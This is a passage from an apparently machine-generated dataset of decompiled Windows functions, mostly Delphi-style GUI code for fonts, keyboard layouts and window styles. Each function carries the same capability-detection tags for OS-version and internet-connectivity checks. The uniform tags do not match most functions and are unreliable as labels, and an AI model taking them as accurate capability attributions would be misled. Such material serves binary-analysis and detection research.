    "0045f008": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f008(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.0045ef5c(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.0045ef5c(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.0045ef8c(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0045f08c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f08c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1da) != '\\0') && (iVar2 = fcn.00449558(),  -1 < iVar2 + -1)) {\n        do {\n            iVar3 = fcn.0044951c();\n            if (((*(iVar3 + 0x57) != '\\0') && (cVar1 = fcn.0045f05c(arg_8h),  cVar1 != '\\0')) ||\n               ((cVar1 = fcn.004040e4(),  cVar1 != '\\0' && (cVar1 = fcn.0045f08c(arg_8h),  cVar1 != '\\0')))) {\n                return 1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "0045f108": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f108(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(in_EAX + 0x1da) != '\\0')) {\n        cVar1 = fcn.0045f05c(&stack0xfffffffc);\n        if ((cVar1 == '\\0') &&\n           ((cVar1 = fcn.0045f05c(&stack0xfffffffc),  cVar1 == '\\0' &&\n            (cVar1 = fcn.0045f08c(&stack0xfffffffc),  cVar1 == '\\0')))) {\n            return;\n        }\n        *(param_2 + 0xc) = 1;\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0045f15c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0045f15c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char var_5h;\n    uint var_4h;\n    \n    var_5h = '\\0';\n    iVar2 = fcn.0041bb4c();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0041bb20();\n            cVar1 = fcn.004040e4();\n            if (cVar1 == '\\0') {\n                var_5h = fcn.0045f15c(arg_8h);\n                if (var_5h != '\\0') {\n                    return var_5h;\n                }\n            }\n            else {\n                cVar1 = fcn.004554b0();\n                if (cVar1 != '\\0') {\n                    return '\\x01';\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return var_5h;\n}\n",
        "token_count": 226
    },
    "0045f1d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar fcn.0045f1d8(void)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30a) != 0) {\n        (**(in_EAX + 0x308))();\n    }\n    if ((((*(in_EAX + 0x290) == 0) || (*(*(in_EAX + 0x290) + 0x38) == 0)) || (cVar1 = fcn.00404154(),  cVar1 == '\\0'))\n       && (cVar1 = fcn.0045f15c(&stack0xfffffffc),  cVar1 == '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 195
    },
    "0045f250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f250(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(arg_8h + 0x298) != 0) && (iVar1 = (****(arg_8h + 0x298))(*(arg_8h + 0x298), arg_ch, arg_10h),  iVar1 == 0)) {\n        return 0;\n    }\n    uVar2 = fcn.0041bccc(arg_8h, arg_ch, arg_10h);\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "0045f2d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045f2d4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*0x491738 != NULL)) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0044d1c8(0xffffffec);\n            uVar3 = sub.user32.dll_GetWindowLongA(uVar2);\n            if ((*(in_EAX + 0x328) == '\\0') && (*(in_EAX + 0x350) == '\\0')) {\n                uVar2 = fcn.0044d1c8(0xffffffec, uVar3 & 0xfff7ffff);\n                sub.user32.dll_SetWindowLongA(uVar2);\n                uVar2 = fcn.0044d1c8(0, 0, 0x485);\n                sub.user32.dll_RedrawWindow(uVar2);\n            }\n            else {\n                if ((uVar3 & 0x80000) == 0) {\n                    uVar2 = fcn.0044d1c8(0xffffffec, uVar3 | 0x80000);\n                    sub.user32.dll_SetWindowLongA(uVar2);\n                }\n                uVar2 = fcn.0044d1c8(*(in_EAX + 0x354), *(in_EAX + 0x329), \n                                     *(*(in_EAX + 0x328) * 4 + 0x4917c8) | *(*(in_EAX + 0x350) * 4 + 0x4917d0));\n                (**0x491738)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 420
    },
    "0045f428": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f428(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.00444c04();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0045be34();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "0045f464": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f464(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.00444c38();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0045be34();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "0045f4a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0045f4a4(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    (**(*in_EAX + 0xf0))();\n    fcn.004592ec();\n    fcn.0045b58c();\n    fcn.0044bcf0();\n    fcn.0045b93c();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = 0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 197
    },
    "0045f9d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045f9d4(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint uVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    puVar2 = *0x492954;\n    (*0x492954)[1] = in_EAX;\n    *puVar2 = 0x45fd78;\n    puVar2 = *0x492960;\n    (*0x492960)[1] = in_EAX;\n    *puVar2 = 0x45fd84;\n    fcn.0045fd90();\n    uVar3 = sub.user32.dll_GetKeyboardLayout(0);\n    *(in_EAX + 0x3c) = uVar3;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 0x4c) = uVar3;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 0x50) = uVar3;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 0x54) = uVar3;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 0x58) = uVar3;\n    uVar3 = fcn.00403f28();\n    *(in_EAX + 0x7c) = uVar3;\n    uVar3 = sub.user32.dll_GetDC(0);\n    uVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0x5a);\n    *(in_EAX + 0x40) = uVar4;\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    uVar4 = 0;\n    (***0x492ad0)(0, 0, fcn.0045b828, *(in_EAX + 0x58));\n    uVar3 = fcn.00420a44();\n    *(in_EAX + 0x84) = uVar3;\n    uVar3 = fcn.00420a44();\n    *(in_EAX + 0x88) = uVar3;\n    uVar3 = fcn.00420a44();\n    *(in_EAX + 0x80) = uVar3;\n    fcn.00460208();\n    iVar1 = *(in_EAX + 0x84);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4600d8;\n    iVar1 = *(in_EAX + 0x88);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4600d8;\n    iVar1 = *(in_EAX + 0x80);\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4600d8;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 782
    },
    "0045fca4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045fca4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x68) != *(in_EAX + 0x74)) && (*(in_EAX + 0x74) = *(in_EAX + 0x68),  *(in_EAX + 0x9a) != 0)) {\n        (**(in_EAX + 0x98))();\n    }\n    if ((*(in_EAX + 100) != *(in_EAX + 0x70)) && (*(in_EAX + 0x70) = *(in_EAX + 100),  *(in_EAX + 0x92) != 0)) {\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0045fd28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045fd28(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00415088();\n    fcn.00415088();\n    fcn.00463134();\n    if ((*(*(in_EAX + 0x50) + 8) == 0) && (*(*0x496584 + 0x84) != 0)) {\n        fcn.0044ebb0();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0045febc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045febc(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack672;\n    uint uStack668;\n    uchar *puStack664;\n    uint uStack656;\n    uint uStack636;\n    uint uStack628;\n    uint uStack624;\n    uchar *puStack620;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_214h;\n    uint var_114h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint hKey;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack620 = &stack0xfffffffc;\n    uStack624 = 0x460067;\n    uStack628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd8c;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x34) == 0) {\n        var_4h = in_EAX;\n        uVar3 = fcn.00403f28();\n        *(var_4h + 0x34) = uVar3;\n        fcn.00404da0();\n        uStack636 = 0x40;\n        iVar4 = sub.user32.dll_GetKeyboardLayoutList();\n        if (-1 < iVar4 + -1) {\n            var_14h = &fcn.0045febc::var_114h;\n            var_10h = iVar4;\n            do {\n                cVar2 = fcn.00452914();\n                if (cVar2 != '\\0') {\n                    uStack656 = 0x45ff74;\n                    uStack656 = fcn.00409c00(0);\n                    uStack636 = 0x80000002;\n                    puStack664 = 0x45ff7f;\n                    iVar4 = sub.advapi32.dll_RegOpenKeyExA_1();\n                    if (iVar4 == 0) {\n                        uStack668 = 0x460023;\n                        uStack672 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xfffffd60;\n                        var_8h = 0x100;\n                        uVar3 = hKey;\n                        puStack664 = &stack0xfffffffc;\n                        iVar4 = sub.advapi32.dll_RegQueryValueExA_1\n                                          (hKey, 0x4600b0, 0, 0, &fcn.0045febc::var_214h, &fcn.0045febc::var_8h);\n                        if (iVar4 == 0) {\n                            fcn.00405010();\n                            (**(**(var_4h + 0x34) + 0x3c))();\n                            if (*var_14h == *(var_4h + 0x3c)) {\n                                fcn.00405010();\n                            }\n                        }\n                        *in_FS_OFFSET = uVar3;\n                        sub.advapi32.dll_RegCloseKey_1(hKey, 0x46002a);\n                        return;\n                    }\n                }\n                var_14h = var_14h + 1;\n                var_10h = var_10h + -1;\n            } while (var_10h != 0);\n        }\n        *(*(var_4h + 0x34) + 0x25) = 0;\n        fcn.0041740c();\n        puVar1 = puStack620;\n    }\n    puStack620 = puVar1;\n    *in_FS_OFFSET = uStack636;\n    uStack628 = 0x46006e;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 843
    },
    "00460208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00460208(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack464;\n    int32_t iStack424;\n    uint uStack420;\n    uchar *puStack416;\n    uint var_191h;\n    uint var_f1h;\n    uint var_b5h;\n    uint pvParam;\n    uint var_1h;\n    \n    puStack416 = &var_1h + 1;\n    var_1h._0_1_ = 0;\n    if (*0x496584 != 0) {\n        var_1h._0_1_ = *(*0x496584 + 0x88);\n    }\n    uStack420 = 0x46034f;\n    iStack424 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack424;\n    puVar1 = &var_1h + 1;\n    if (*0x496584 != 0) {\n        fcn.00462d08();\n        puVar1 = puStack416;\n    }\n    puStack416 = puVar1;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x1f, 0x3c, &pvParam, 0);\n    if (iVar2 == 0) {\n        sub.gdi32.dll_GetStockObject(0xd);\n        fcn.00420e94();\n    }\n    else {\n        sub.gdi32.dll_CreateFontIndirectA(&pvParam);\n        fcn.00420e94();\n    }\n    var_191h = 0x154;\n    iVar2 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_191h, 0);\n    if (iVar2 == 0) {\n        fcn.00420f78();\n        puStack464 = 0xd;\n        sub.gdi32.dll_GetStockObject();\n        fcn.00420e94();\n    }\n    else {\n        puStack464 = &var_b5h;\n        sub.gdi32.dll_CreateFontIndirectA();\n        fcn.00420e94();\n        sub.gdi32.dll_CreateFontIndirectA(&var_f1h);\n        fcn.00420e94();\n    }\n    fcn.00420c18();\n    fcn.00420c18();\n    *in_FS_OFFSET = puStack464;\n    if (*0x496584 != 0) {\n        fcn.00462d08(0x460356);\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "00460364": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460364(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    if ((*(in_EAX + 0x8c) == 0) && ((*(in_EAX + 0x8e) & 0x10) != 0)) {\n        fcn.00460384();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00460414": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00460414(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    char in_DL;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar3 = *(*(arg_8h + -4) + 8) - **(arg_8h + -4);\n    if ((iVar3 < 0) || (in_DL - 3U < 2)) {\n        iVar3 = in_EAX[0x12];\n    }\n    var_10h = *(*(arg_8h + -4) + 0xc) - *(*(arg_8h + -4) + 4);\n    if ((var_10h < 0) || (in_DL - 1U < 2)) {\n        var_10h = in_EAX[0x13];\n    }\n    if ((in_DL == '\\x01') && (*(in_EAX + 0x273) == '\\x02')) {\n        var_8h = fcn.0045a384();\n        var_ch = fcn.0045a3a4();\n        iVar3 = (***0x4929e4)(0x3d);\n    }\n    else {\n        var_8h = **(arg_8h + -4);\n        var_ch = *(*(arg_8h + -4) + 4);\n    }\n    if (in_DL == '\\x01') {\n        piVar1 = *(arg_8h + -4) + 4;\n        *piVar1 = *piVar1 + var_10h;\n    }\n    else if (in_DL == '\\x02') {\n        piVar1 = *(arg_8h + -4) + 0xc;\n        *piVar1 = *piVar1 - var_10h;\n        var_ch = *(*(arg_8h + -4) + 0xc);\n    }\n    else if (in_DL == '\\x03') {\n        **(arg_8h + -4) = **(arg_8h + -4) + iVar3;\n    }\n    else if (in_DL == '\\x04') {\n        piVar1 = *(arg_8h + -4) + 8;\n        *piVar1 = *piVar1 - iVar3;\n        var_8h = *(*(arg_8h + -4) + 8);\n    }\n    (**(*in_EAX + 0x88))(var_10h, iVar3);\n    if (*(in_EAX + 0x273) == '\\x02') {\n        iVar3 = iVar3 - var_8h;\n        var_10h = var_10h - var_ch;\n    }\n    iVar2 = in_EAX[0x12];\n    if ((iVar3 != iVar2) || (in_EAX[0x13] != var_10h)) {\n    // switch table (6 cases) at 0x46055a\n        switch(in_DL) {\n        case '\\x01':\n            piVar1 = *(arg_8h + -4) + 4;\n            *piVar1 = *piVar1 - (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x02':\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n            break;\n        case '\\x03':\n            **(arg_8h + -4) = **(arg_8h + -4) - (iVar3 - iVar2);\n            break;\n        case '\\x04':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            break;\n        case '\\x05':\n            piVar1 = *(arg_8h + -4) + 8;\n            *piVar1 = *piVar1 + (iVar3 - iVar2);\n            piVar1 = *(arg_8h + -4) + 0xc;\n            *piVar1 = *piVar1 + (var_10h - in_EAX[0x13]);\n        }\n    }\n    return;\n}\n",
        "token_count": 990
    },
    "004605d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004605d0(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    (**(**(arg_8h + -8) + 8))();\n    if ((((*(arg_8h + -0xc) != 0) && (*(*(arg_8h + -0xc) + 0x30) == 0)) && ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0))\n       && (((*(*(arg_8h + -0xc) + 0x57) != '\\0' && (*(*(arg_8h + -0xc) + 0x5b) == in_AL)) &&\n           (*(*(arg_8h + -0xc) + 0x273) != '\\x01')))) {\n        fcn.00414d8c();\n    }\n    iVar2 = fcn.0045fc9c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0045fc88();\n            if (((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x5b) == in_AL)) &&\n               (((*(iVar3 + 0x1c) & 0x10) == 0 &&\n                (((*(iVar3 + 0x57) != '\\0' && (*(iVar3 + 0x273) != '\\x01')) && (iVar3 != *(arg_8h + -0xc))))))) {\n                for (iVar3 = 0; iVar3 < *(*(arg_8h + -8) + 8); iVar3 = iVar3 + 1) {\n                    fcn.00414eec();\n                    cVar1 = fcn.0046038c();\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00414f68();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = *(*(arg_8h + -8) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = arg_8h;\n            fcn.00414eec();\n            fcn.00460414(iVar3);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00460720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00460720(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0045fc9c();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0045fc88();\n            if ((((*(iVar2 + 0x30) == 0) && ((*(iVar2 + 0x1c) & 0x10) == 0)) && (*(iVar2 + 0x5b) != '\\0')) &&\n               ((*(iVar2 + 0x57) != '\\0' && (*(iVar2 + 0x273) != '\\x01')))) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "00460800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460800(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x8c) != 0) {\n        *(in_EAX + 0x8e) = *(in_EAX + 0x8e) | 0x10;\n        return;\n    }\n    puStack32 = 0x46082e;\n    var_4h = in_EAX;\n    fcn.0046035c();\n    uStack36 = 0x460879;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = 0x30;\n    puStack32 = &stack0xfffffffc;\n    sub.user32.dll_SystemParametersInfoA(0x30, 0, &fcn.00460800::var_14h, 0);\n    fcn.00460778();\n    *in_FS_OFFSET = uVar1;\n    *(var_4h + 0x8e) = *(var_4h + 0x8e) & 0xffef;\n    fcn.00460364(0x460880);\n    return;\n}\n",
        "token_count": 306
    },
    "00460894": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00460894(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.00404df4();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 106
    },
    "004608cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004608cc(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "004608ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004608ec(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x496584 != 0) {\n        uStack24 = 0x46091d;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.00463368();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00460940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
